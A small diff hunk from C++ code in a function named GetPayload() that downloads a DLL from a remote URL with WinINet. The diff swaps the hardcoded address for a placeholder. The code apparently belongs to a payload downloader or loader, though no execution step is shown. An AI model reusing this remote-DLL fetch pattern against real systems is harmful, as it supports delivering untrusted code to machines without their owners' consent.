@@ -25,7 +25,7 @@ void GetPayload() {
 	}
 	else {
 		//if using not relative url use InternetCanonicalizeUrl
-		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "http://brickbullet.com/rmtsrc/testdll.dll", 0, 0, INTERNET_FLAG_RELOAD, 0);
+		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "<url>", 0, 0, INTERNET_FLAG_RELOAD, 0);
 		if (iOpen == NULL) {
 			std::cerr << "could not access resource: " << GetLastErrorAsString();
 		}
